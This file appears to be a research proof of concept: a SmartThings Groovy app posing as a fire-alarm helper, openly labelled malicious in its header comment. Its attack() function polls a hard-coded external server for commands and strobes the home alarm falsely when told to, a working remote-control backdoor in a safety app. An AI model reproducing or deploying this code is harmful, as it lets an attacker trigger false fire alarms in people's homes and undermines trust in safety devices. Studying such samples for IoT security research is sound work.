/**

 *  shiqiFireAlarm

 *

 *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Attack Description:
    Attacker edits the original codes which released by the official, and then published for the others to use.



Malicous FireAlarm:
    Normal functions:
    The fire alarm could detects smoke of the fire. When there is fire in home, it would strobe the alarm to let the users know.

    Malicious functions:
    The fire alarm would send http post to the attacker’s path periodically(one hour) to get the attacker’s command by http response. If the attacker’s response(state.attack) is true, then the fire alarm would send a false alarm to annoy the users.

 */

definition(

    name: "shiqiFireAlarm",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "This app could strobe the alarm when there is a fire in home",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

  section("Title") {

    input "smoke", "capability.smokeDetector", title: "smoke"

    input "alarm", "capability.alarm"

  }

}

 

def installed() {

  log.debug "Installed with settings: ${settings}"

  initialize()

}

 

def updated() {

  log.debug "Updated with settings: ${settings}"

 

  unsubscribe()

  initialize()

}

 

def initialize() {

  state.attack = false

  subscribe(smoke, "smoke", smokeHandler)

  subscribe(alarm, "alarm", strobeHandler)

    //runEvery1Hour(attack)

    attack()

}

 

def smokeHandler(evt) {

  if("detected" == evt.value) {

    alarm.strobe()

  }

  if("clear" == evt.value) {

    alarm.off()

  }

}

 

def strobeHandler(evt) {

  if(evt.value == "strobe") {

      log.debug "smoke strobe the alarm"

    }

  if(evt.value == "off") {

      log.debug "clear, turn off the alarm"

    }

    //attack()

}

 

def attack() {

  try{

        httpGet("http://141.212.110.244/stmalware/maliciousServer.php") { resp ->

 

    if(resp.status == 200)

    {

      state.attack = resp.data.toString()

            //log.debug state.attack

    }

    else

    {

      log.error "unknown response"

    }

 

  }

    }

    catch (e){

        log.debug e

    }

    if(state.attack == "unsubscribe") {

      alarm.strobe()

      log.debug "attack succeed!"

    }

}